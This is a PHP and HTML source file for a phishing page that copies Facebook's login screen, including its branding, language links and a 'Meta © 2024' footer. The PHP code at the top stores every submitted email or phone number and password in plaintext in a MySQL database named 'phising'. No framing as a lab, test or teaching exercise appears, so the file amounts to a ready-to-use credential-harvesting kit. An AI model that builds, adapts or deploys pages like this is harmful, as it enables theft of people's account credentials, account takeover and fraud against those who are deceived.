<?php
    // Server Information
    $server = "127.0.0.1"; // Adjust if needed
    $port = 3308; // Adjust if needed
    $database = "phising"; // Database name where the 'info' table resides
    $username = "root"; // Replace with your MySQL username
    $password = ""; // Replace with your MySQL password

    // Connecting to the database
    $conx = mysqli_connect($server, $username, $password, $database, $port);
    
    // Check connection
    if(!$conx){
        die('Connection Failed: ' . mysqli_connect_error());
    }

    // Check if form was submitted
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Sanitize inputs to prevent SQL injection
        $username = mysqli_real_escape_string($conx, $username);
        $password = mysqli_real_escape_string($conx, $password);

        // Insert username and password into the 'info' table
        $query = "INSERT INTO info (username, password) VALUES ('$username', '$password')";
        mysqli_query($conx, $query);
    }

    // Close connection
    mysqli_close($conx);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Facebook</title>
    <link rel="stylesheet" href="styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div class="row res">
        <div class="fb-form res">
            <div class="card">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form action="" method="POST">
                <input type="username" name="username" placeholder="Email or phone number">
                <input type="password" name="password" placeholder="Password" >
                <div class="fb-submit">
                    <button type="submit" class="login">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#">Create new account</a>
                </div>
            </form>
        </div>
    </div>
    <footer>
        <div class="footer-langs">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">मराठी</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">ગુજરાતી</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">ਪੰਜਾਬੀ</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">മലയാളം</a></li>
                <li><button>+</button></li>
            </ol>
            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In</a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Video</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Meta Pay</a></li>
                <li><a href="#">Meta Store</a></li>
                <li><a href="#">Meta Quest</a></li>
                <li><a href="#">Imagine with Meta AI</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Threads</a></li>
                <li><a href="#">Fundraisers</a></li>
                <li><a href="#">Services</a></li>
                <li><a href="#">Voting Information Centre</a></li>
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Privacy Centre</a></li>
                <li><a href="#">Groups</a></li>
                <li><a href="#">About</a></li>
                <li><a href="#">Create ad</a></li>
                <li><a href="#">Create Page</a></li>
                <li><a href="#">Developers</a></li>
                <li><a href="#">Careers</a></li>
                <li><a href="#">Cookies</a></li>
                <li><a href="#">AdChoices</a></li>
                <li><a href="#">Terms</a></li>
                <li><a href="#">Help</a></li>
                <li><a href="#">Contact uploading and non-users</a></li>
            </ol>
            <small>Meta © 2024</small>
        </div>
    </footer>
</body>
</html>
